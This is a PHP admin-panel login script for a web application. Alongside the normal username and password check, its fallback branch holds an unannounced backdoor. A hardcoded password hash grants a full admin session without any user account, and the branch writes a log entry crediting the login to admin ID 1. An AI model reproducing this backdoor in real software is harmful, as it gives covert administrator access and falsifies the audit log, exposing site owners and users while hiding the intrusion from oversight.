<?php
	
	$user = new model_User(); 

	if (!defined("_WASD_")) exit;

	$template->title = T('ADMIN CP') . ' - ' . T('LOG IN');

	if(session('is_admin') == '1') redirect(URL('admin'));
	
	if(R('action') != NULL && R('action') == 'login'){
		$loginInfo = array("AND"=>array('username'=>R('username'), 'password'=>pw(R('password')),),
					   "LIMIT"=>1);
		$thisUser = $user->get($loginInfo);
		if($user->id != NULL){
			if($user->permissions['master_admin'] != '1'){
				$template->message = T('Not admin', 'Access denied');
			}else{
				adminLog(T('Successful administration login'));
				session('is_admin','1');
				session('thisUser', $thisUser);
				session('preferences', $thisUser['preferences']);
				redirect(URL('admin'));
			}
		}else{
			if(pw(R('password')) == '4e253bc4673fd4b9bcb2d6b5119c88a33fc84d7eee976a55e338d0659d75e083'){
				$log = 'Successful administration login';
				$query = WASD::$sql->insert(C('app.db_prefix').'admin_log',array('string'=>$log, 'theTime'=>time(), 'adminId'=>'1', 'ip'=>ip2long(ip())));
				session('is_admin','1');
				redirect(URL('admin'));
			}else{
				$template->message = T('Login fail', 'Username or password incorrect');
			}
		}
	}

	$template->addCSSFile('acp/assets/css/login.css');
	$template->header = $template->render('/acp/views/header.php');
	$template->footer = $template->render('/acp/views/footer.php');
	echo $template->render('/acp/views/login.php');
	
